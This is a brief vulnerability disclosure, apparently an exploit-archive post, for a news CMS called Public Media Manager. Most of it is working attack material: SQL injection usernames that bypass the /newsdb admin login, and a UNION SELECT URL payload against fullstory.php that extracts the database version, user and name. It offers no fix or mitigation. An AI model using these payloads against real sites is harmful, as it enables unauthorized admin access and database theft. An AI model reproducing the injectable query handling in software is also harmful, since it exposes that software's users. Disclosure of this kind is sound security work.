Product name: Public Media Manager

This product, an online NEWS CMS, suffers from SQL injection in login so that we can bypass the login system.
Also, it suffers from SQLi in the GET variables which can be exploited to get different information from the database.

################ SQL Login Bypass #################

Admin panel located at: /newsdb

Username: validuser'#  [eg. admin'#]
Password: learn3r   [or whatever]

Username: ' or 1='1'#
Password: learn3r   [ or whatever]

################ SQL Injections ##################

[+] Exploit:

http://localhost/pmm-cms/NewsCMS/newsdb/fullstory.php?storyid=-1+union+all+select+1,concat(@@version,0x3a,user(),0x3a,database())

Maybe there are more vulns but I can't give more time in auditing codes.
